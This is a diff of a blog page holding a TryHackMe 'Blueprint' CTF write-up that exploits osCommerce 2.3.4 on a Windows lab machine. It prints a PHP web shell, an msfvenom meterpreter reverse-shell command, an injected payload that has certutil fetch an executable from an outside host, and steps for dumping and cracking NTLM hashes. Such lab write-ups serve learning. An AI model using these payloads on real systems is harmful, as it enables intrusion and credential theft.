@@ -14,23 +14,23 @@
     <meta property="og:type" content="article" />
     <meta property="og:title" content="BluePrint TryHackMe | write-up" />
     <meta property="og:description" content="Hello everyone, today&#x27;s challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note: 	 &quot;Do you have what is takes to hack into this Windows Machine?&quot; ENUMERATION TIMEroot@kali:~# nmap -sC -sV 10.10.41.176 Starting Nmap 7.80 ( https:" />
-    <meta property="og:url" content="https://fr33s0ul.tech/blueprint-tryhackme-write-up/" />
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/blueprint.jpg" />
+    <meta property="og:url" content="http://localhost:2368/blueprint-tryhackme-write-up/" />
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/blueprint.jpg" />
     <meta property="article:published_time" content="2020-04-11T13:09:40.000Z" />
-    <meta property="article:modified_time" content="2020-11-21T15:23:58.000Z" />
+    <meta property="article:modified_time" content="2022-03-24T15:39:16.000Z" />
     <meta property="article:tag" content="CTF" />
     
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="BluePrint TryHackMe | write-up" />
     <meta name="twitter:description" content="Hello everyone, today&#x27;s challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note: 	 &quot;Do you have what is takes to hack into this Windows Machine?&quot; ENUMERATION TIMEroot@kali:~# nmap -sC -sV 10.10.41.176 Starting Nmap 7.80 ( https:" />
-    <meta name="twitter:url" content="https://fr33s0ul.tech/blueprint-tryhackme-write-up/" />
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/blueprint.jpg" />
+    <meta name="twitter:url" content="http://localhost:2368/blueprint-tryhackme-write-up/" />
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/blueprint.jpg" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="fr33s0ul" />
     <meta name="twitter:label2" content="Filed under" />
     <meta name="twitter:data2" content="CTF" />
-    <meta name="twitter:site" content="@fr3350u1" />
-    <meta name="twitter:creator" content="@fr33soul_" />
+    <meta name="twitter:site" content="@fr33s0ul_Ninja" />
+    <meta name="twitter:creator" content="@fr33s0ul_Ninja" />
     <meta property="og:image:width" content="1950" />
     <meta property="og:image:height" content="1300" />
     
@@ -41,10 +41,10 @@
     "publisher": {
         "@type": "Organization",
         "name": "fr33s0ul",
-        "url": "https://fr33s0ul.tech/",
+        "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+            "url": "http://localhost:2368/content/images/2020/03/logo.gif",
             "width": 300,
             "height": 41
         }
@@ -54,22 +54,22 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
-        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "url": "http://localhost:2368/author/fr33s0ul/",
         "sameAs": [
-            "https://twitter.com/fr33soul_"
+            "https://twitter.com/fr33s0ul_Ninja"
         ]
     },
     "headline": "BluePrint TryHackMe | write-up",
-    "url": "https://fr33s0ul.tech/blueprint-tryhackme-write-up/",
+    "url": "http://localhost:2368/blueprint-tryhackme-write-up/",
     "datePublished": "2020-04-11T13:09:40.000Z",
-    "dateModified": "2020-11-21T15:23:58.000Z",
+    "dateModified": "2022-03-24T15:39:16.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/blueprint.jpg",
+        "url": "http://localhost:2368/content/images/2020/04/blueprint.jpg",
         "width": 1950,
         "height": 1300
     },
@@ -77,12 +77,12 @@
     "description": "Hello everyone, today&#x27;s challenge is really fun! rated as easy, and we get no\nhints or instruction, only one question as a note:\n\n &quot;Do you have what is takes to hack into this Windows Machine?&quot;\n\n&gt; ENUMERATION TIME\nroot@kali:~# nmap -sC -sV 10.10.41.176\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC\nNmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)\nHost is up (0.00042s latency).\nNot shown: 991 closed ports\nPORT      STATE SERVICE     VERSION\n135/tcp  ",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://fr33s0ul.tech/"
+        "@id": "http://localhost:2368/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 3.38" />
+    <meta name="generator" content="Ghost 4.41" />
     <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../../rss/index.html" />
 
     <style amp-custom>
@@ -207,7 +207,7 @@
     }
 
     a {
-        color: #1292EE;
+        color: var(--ghost-accent-color, #1292EE);
         text-decoration-skip-ink: auto;
     }
 
@@ -355,7 +355,20 @@
         top: 0;
         bottom: 0;
         width: 0.3rem;
-        background: #000;
+        background: var(--ghost-accent-color, #1292EE);
+    }
+
+    .post-content blockquote.kg-blockquote-alt {
+        font-size: 1.2em;
+        font-style: italic;
+        line-height: 1.6em;
+        text-align: center;
+        color: #738a94;
+        padding: 0.75em 3em 1.25em;
+    }
+
+    .post-content blockquote.kg-blockquote-alt::before {
+        display: none;
     }
 
     .post-content :not(.kg-card):not([id]) + .kg-card {
@@ -386,7 +399,7 @@
         font-weight: 400;
         font-size: 0.9em;
         line-height: 1em;
-        color: #dc0050;
+        color: #15171a;
         background: #f0f6f9;
         border-radius: 0.25em;
     }
@@ -452,7 +465,7 @@
         background: rgba(255,255,255,0.6);
         font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
         text-decoration: none;
-        border-radius: 5px;
+        border-radius: 3px;
         box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
         overflow: hidden;
     }
@@ -532,6 +545,398 @@
     .kg-bookmark-publisher::before {
         content: "•";
         margin: 0 .5em;
+    }
+
+    .kg-toggle-card-icon {
+        display: none;
+    }
+
+    .kg-toggle-content {
+        margin-top: 0.8rem;
+    }
+
+    .kg-product-card-container {
+        background: transparent;
+        padding: 20px;
+        width: 100%;
+        border-radius: 5px;
+        box-shadow: inset 0 0 0 1px rgb(124 139 154 / 25%);
+    }
+
+    .kg-product-card-description p {
+        margin-top: 1.5em;
+    }
+
+    .kg-product-card-description ul {
+        margin-left: 24px;
+    }
+
+    .kg-product-card-title {
+        font-size: 1.9rem;
+        font-weight: 700;
+    }
+
+    .kg-product-card-rating-star {
+        height: 28px;
+        width: 20px;
+        margin-right: 2px;
+    }
+
+    .kg-product-card-rating-star svg {
+    width: 16px;
+    height: 16px;
+    fill: currentColor;
+    opacity: 0.15;
+    }
+
+    .kg-product-card-rating-active.kg-product-card-rating-star svg {
+    opacity: 1;
+    }
+
+    .kg-nft-card-container {
+        position: relative;
+        display: flex;
+        flex: auto;
+        flex-direction: column;
+        text-decoration: none;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.4rem;
+        font-weight: 400;
+        box-shadow: 0 2px 6px -2px rgb(0 0 0 / 10%), 0 0 1px rgb(0 0 0 / 40%);
+        width: 100%;
+        max-width: 512px;
+        color: #15212A;
+        background: #fff;
+        border-radius: 5px;
+        transition: none;
+        margin: 0 auto;
+    }
+
+    .kg-nft-metadata {
+        padding: 2.0rem;
+    }
+
+    .kg-nft-image-container {
+        position: relative;
+    }
+
+    .kg-nft-image {
+        display: flex;
+        border-radius: 5px 5px 0 0;
+    }
+
+    .kg-nft-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        gap: 20px;
+    }
+
+    .kg-nft-header h4.kg-nft-title {
+        font-size: 1.9rem;
+        font-weight: 700;
+        margin: 0;
+        color: #15212A;
+    }
+
+    .kg-nft-header amp-img {
+        max-width: 114px;
+        max-height: 26px;
+    }
+
+    .kg-nft-opensea-logo {
+        margin-top: 2px;
+        width: 100px;
+    }
+
+    .kg-nft-creator {
+        font-family: inherit;
+        color: #95A1AD;
+    }
+
+    .kg-nft-creator span {
+        font-weight: 500;
+        color: #15212A;
+    }
+
+    .kg-nft-card p.kg-nft-description {
+        font-size: 1.4rem;
+        line-height: 1.4em;
+        margin: 2.0rem 0 0;
+        color: #222;
+    }
+
+    .kg-button-card {
+        display: flex;
+        position: static;
+        align-items: center;
+        width: 100%;
+        justify-content: center;
+    }
+
+    .kg-btn {
+        display: flex;
+        position: static;
+        align-items: center;
+        padding: 0 2.0rem;
+        height: 4.0rem;
+        line-height: 4.0rem;
+        font-size: 1.65rem;
+        font-weight: 600;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .kg-btn:hover {
+        opacity: 0.85;
+    }
+
+    .kg-btn-accent {
+        background-color: var(--ghost-accent-color, #1292EE);
+        color: #fff;
+    }
+
+    .kg-callout-card {
+        display: flex;
+        padding: 20px 28px;
+        border-radius: 3px;
+    }
+
+    .kg-callout-card-grey {
+        background: rgba(124, 139, 154, 0.13);
+    }
+
+    .kg-callout-card-white {
+        background: transparent;
+        box-shadow: inset 0 0 0 1px rgba(124, 139, 154, 0.25);
+    }
+
+    .kg-callout-card-blue {
+        background: rgba(33, 172, 232, 0.12);
+    }
+
+    .kg-callout-card-green {
+        background: rgba(52, 183, 67, 0.12);
+    }
+
+    .kg-callout-card-yellow {
+        background: rgba(240, 165, 15, 0.13);
+    }
+
+    .kg-callout-card-red {
+        background: rgba(209, 46, 46, 0.11);
+    }
+
+    .kg-callout-card-pink {
+        background: rgba(225, 71, 174, 0.11);
+    }
+
+    .kg-callout-card-purple {
+        background: rgba(135, 85, 236, 0.12);
+    }
+
+    .kg-callout-card-accent {
+        background: var(--ghost-accent-color);
+        color: #fff;
+    }
+
+    .kg-callout-card-accent a {
+        color: #fff;
+    }
+
+    .kg-callout-emoji {
+        padding-right: 16px;
+        line-height: 1.3;
+        font-size: 1.25em;
+    }
+
+    .kg-header-card {
+        padding: 6em 3em;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+    }
+
+    .kg-header-card.kg-size-small {
+        padding-top: 4em;
+        padding-bottom: 4em;
+    }
+
+    .kg-header-card.kg-size-large {
+        padding-top: 12em;
+        padding-bottom: 12em;
+    }
+
+    .kg-header-card.kg-width-full {
+        padding-left: 4em;
+        padding-right: 4em;
+    }
+
+    .kg-header-card.kg-align-left {
+        text-align: left;
+        align-items: flex-start;
+    }
+
+    .kg-header-card.kg-style-dark {
+        background: #15171a;
+        color: #ffffff;
+    }
+
+    .kg-header-card.kg-style-light {
+        color: #15171a;
+        border: 1px solid rgba(124, 139, 154, 0.25);
+        border-width: 1px 0;
+    }
+
+    .kg-header-card.kg-style-accent {
+        background-color: var(--ghost-accent-color);
+    }
+
+    .kg-header-card.kg-style-image {
+        background-color: #e7e7eb;
+        background-size: cover;
+        background-position: center center;
+    }
+
+    .kg-header-card h2 {
+        font-size: 4em;
+        font-weight: 700;
+        line-height: 1.1em;
+        margin: 0;
+    }
+
+    .kg-header-card h2 strong {
+        font-weight: 800;
+    }
+
+    .kg-header-card.kg-size-small h2 {
+        font-size: 3em;
+    }
+
+    .kg-header-card.kg-size-large h2 {
+        font-size: 5em;
+    }
+
+    .kg-header-card h3 {
+        font-size: 1.25em;
+        font-weight: 500;
+        line-height: 1.3em;
+        margin: 0;
+    }
+
+    .kg-header-card h3 strong {
+        font-weight: 600;
+    }
+
+    .kg-header-card.kg-size-small h3 {
+        font-size: 1em;
+    }
+
+    .kg-header-card.kg-size-large h3 {
+        font-size: 1.5em;
+    }
+
+    .kg-header-card:not(.kg-style-light) h2,
+    .kg-header-card:not(.kg-style-light) h3 {
+        color: #ffffff;
+    }
+
+    .kg-header-card a.kg-header-card-button {
+        display: flex;
+        position: static;
+        align-items: center;
+        padding: 0 1.2em;
+        height: 2.4em;
+        line-height: 1em;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-size: 0.95em;
+        font-weight: 600;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: opacity 0.2s ease-in-out;
+        background-color: var(--ghost-accent-color);
+        color: #ffffff;
+        margin: 1.75em 0 0;
+    }
+
+    .kg-header-card a.kg-header-card-button:hover {
+        opacity: 0.85;
+    }
+
+    .kg-header-card.kg-size-large a.kg-header-card-button {
+        margin-top: 2em;
+    }
+
+    .kg-header-card.kg-size-small a.kg-header-card-button {
+        margin-top: 1.5em;
+    }
+
+    .kg-header-card.kg-style-image a.kg-header-card-button,
+    .kg-header-card.kg-style-dark a.kg-header-card-button {
+        background: #ffffff;
+        color: #15171a;
+    }
+
+    .kg-header-card.kg-style-accent a.kg-header-card-button {
+        background: #ffffff;
+        color: var(--ghost-accent-color);
+    }
+
+    .kg-audio-card {
+        display: flex;
+        width: 100%;
+        box-shadow: inset 0 0 0 1px rgba(124, 139, 154, 0.25);
+    }
+
+    .kg-audio-thumbnail {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 80px;
+        min-width: 80px;
+        height: 80px;
+        background: transparent;
+        object-fit: cover;
+        aspect-ratio: 1/1;
+        border-radius: 3px 0 0 3px;
+    }
+
+    .kg-audio-thumbnail.placeholder {
+        background: var(--ghost-accent-color);
+    }
+
+    .kg-audio-thumbnail.placeholder svg {
+        width: 24px;
+        height: 24px;
+        fill: white;
+    }
+
+    .kg-audio-player-container {
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        width: 100%;
+        --seek-before-width: 0%;
+        --volume-before-width: 100%;
+        --buffered-width: 0%;
+    }
+
+    .kg-audio-title {
+        width: 100%;
+        padding: 8px 12px 0;
+        border: none;
+        font-family: inherit;
+        font-size: 1.1em;
+        font-weight: 700;
+        background: transparent;
+    }
+
+    .kg-audio-player {
+        display: none;
     }
 
     .kg-width-full.kg-card-hascaption {
@@ -642,6 +1047,8 @@
             font-size: 1.7rem;
         }
     }
+
+    :root {--ghost-accent-color: #15171A;}
     </style>
 
     <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
@@ -654,7 +1061,7 @@
 <body class="amp-template">
     <header class="page-header">
         <a href="../../index.html">
-                <amp-img class="site-icon" src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
+                <amp-img class="site-icon" src="http://localhost:2368/content/images/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
         </a>
     </header>
 
@@ -669,7 +1076,7 @@
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/blueprint.jpg" width="600" height="340" layout="responsive"></amp-img>
+                <amp-img src="http://localhost:2368/content/images/2020/04/blueprint.jpg" width="600" height="340" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
@@ -761,14 +1168,14 @@ else:
     print("[-] Exploit did not execute as planned")</code></pre><figcaption>shell.php contains | &lt;?php $cmd=$_GET['cmd']; system($cmd);?&gt;</figcaption></figure><p>The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.</p><p>running the file <strong>configure.php</strong> in the directory <strong>/oscommerce-2.3.4/catalog/install/inclues/</strong> will execute our pushed payload and upload our shell</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>I use python to create a simple server to share files.</figcaption></figure><figure class="kg-card kg-image-card"></figure><p>I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator</p><p>Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &gt; Service_system_update.exe</code></pre><p>the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the <strong>configure.php</strong> file from the includes directory.</p><pre><code>payload = '\');'
 payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
 payload += 'echo $var;'
-payload += '/*'</code></pre><p></p><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><p>to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the <strong>NTLM</strong> hash of the user Lab, the password is very common you can decrypt it just in <strong>crackstation.net</strong>, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://crackstation.net/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</div><div class="kg-bookmark-description">Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...</div><div class="kg-bookmark-metadata"><span class="kg-bookmark-publisher">MD5, SHA1, Linux, Rainbow Tables, etc.</span></div></div><div class="kg-bookmark-thumbnail"><amp-anim src="https://crackstation.net/images/1by1.gif" width="1" height="1" layout="fixed"></amp-anim></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"><div class="kg-bookmark-content"><div class="kg-bookmark-title">osCommerce 2.3.4.1 - Remote Code Execution</div><div class="kg-bookmark-description">osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" width="16" height="16" layout="fixed"></amp-img><span class="kg-bookmark-author">Simon Scannell</span><span class="kg-bookmark-publisher">Exploit Database</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://www.exploit-db.com/images/spider-orange.png" width="144" height="144" layout="fixed"></amp-img></div></a></figure><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a>
+payload += '/*'</code></pre><p></p><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><p>to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the <strong>NTLM</strong> hash of the user Lab, the password is very common you can decrypt it just in <strong>crackstation.net</strong>, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://crackstation.net/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</div><div class="kg-bookmark-description">Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...</div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">MD5, SHA1, Linux, Rainbow Tables, etc.</span></div></div><div class="kg-bookmark-thumbnail"><amp-anim src="https://crackstation.net/images/1by1.gif" alt width="1" height="1" layout="fixed"></amp-anim></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"><div class="kg-bookmark-content"><div class="kg-bookmark-title">osCommerce 2.3.4.1 - Remote Code Execution</div><div class="kg-bookmark-description">osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" alt width="16" height="16" layout="fixed"></amp-img><span class="kg-bookmark-author">Exploit Database</span><span class="kg-bookmark-publisher">Simon Scannell</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://www.exploit-db.com/images/spider-orange.png" alt width="144" height="144" layout="fixed"></amp-img></div></a></figure><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>Crypto donations are appreciated for more free content and exciting topics <strong>0x684c21519d43E415506c1750c08FA0A97621FFEF</strong></figcaption></figure>
 
             </section>
 
         </article>
     </main>
     <footer class="page-footer">
-            <amp-img class="site-icon" src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
+            <amp-img class="site-icon" src="http://localhost:2368/content/images/2020/04/download.png" width="50" height="50" layout="fixed"></amp-img>
         <h3>fr33s0ul</h3>
             <p>Cybersecurity, Technology, and CTFs</p>
         <p><a href="../../index.html">Read more posts →</a></p>
